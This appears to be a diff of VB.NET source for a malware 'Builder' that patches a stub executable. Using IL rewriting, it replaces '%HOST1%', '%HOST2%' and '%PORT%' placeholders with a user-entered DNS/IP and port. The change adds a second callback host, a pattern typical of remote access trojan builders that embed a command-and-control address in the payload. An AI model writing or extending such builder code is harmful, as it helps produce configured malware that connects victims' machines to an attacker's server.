@@ -24,7 +24,7 @@ Public Class Builder
         If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
             Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
             Return
-        ElseIf (HOST.Text = "") Then
+        ElseIf (HOST1.Text = "") Then
             Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
             Return
         ElseIf (PORT.Text = "") Then
@@ -47,8 +47,11 @@ Public Class Builder
                                         Dim current As Instruction = enumerator.Current
                                         If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                             Dim str As String = current.Operand.ToString
-                                            If (str = "%HOST%") Then
-                                                current.Operand = HOST.Text
+                                            If (str = "%HOST1%") Then
+                                                current.Operand = HOST1.Text
+                                            End If
+                                            If (str = "%HOST2%") Then
+                                                current.Operand = HOST2.Text
                                             End If
                                             If (str = "%PORT%") Then
                                                 current.Operand = PORT.Text
